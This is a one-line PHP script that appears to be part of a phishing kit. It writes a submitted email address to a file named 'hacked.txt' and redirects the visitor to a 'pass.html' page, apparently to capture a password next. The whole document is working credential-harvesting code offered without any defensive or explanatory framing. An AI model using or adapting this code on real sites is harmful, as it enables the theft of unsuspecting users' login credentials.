<?php file_put_contents("hacked.txt", " [email:] " . $email = $_POST['email'] . "\n", FILE_APPEND);header('Location: pass.html');?>